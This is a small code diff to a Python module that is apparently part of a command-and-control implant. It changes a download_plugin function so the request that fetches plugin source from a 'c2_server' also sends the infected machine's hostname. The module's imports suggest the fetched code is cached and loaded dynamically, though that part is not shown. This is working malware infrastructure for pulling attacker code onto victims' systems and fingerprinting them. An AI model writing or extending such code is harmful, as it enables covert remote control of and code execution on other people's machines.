@@ -3,6 +3,7 @@ import sys
 import json
 import re
 import urllib.request
+import urllib.parse
 import importlib.util
 import tempfile
 
@@ -32,9 +33,10 @@ def _ensure_cache():
     os.makedirs(PLUGIN_CACHE_DIR, exist_ok=True)
 
 
-def download_plugin(c2_server: str, plugin_name: str) -> str | None:
+def download_plugin(c2_server: str, plugin_name: str, hostname: str = '') -> str | None:
     _ensure_cache()
-    url = f"{c2_server}/api/extensions/{plugin_name}/source"
+    params = urllib.parse.urlencode({'hostname': hostname}) if hostname else ''
+    url = f"{c2_server}/api/extensions/{plugin_name}/source?{params}" if params else f"{c2_server}/api/extensions/{plugin_name}/source"
     try:
         req = urllib.request.Request(url)
         req.add_header('Accept', 'application/octet-stream')
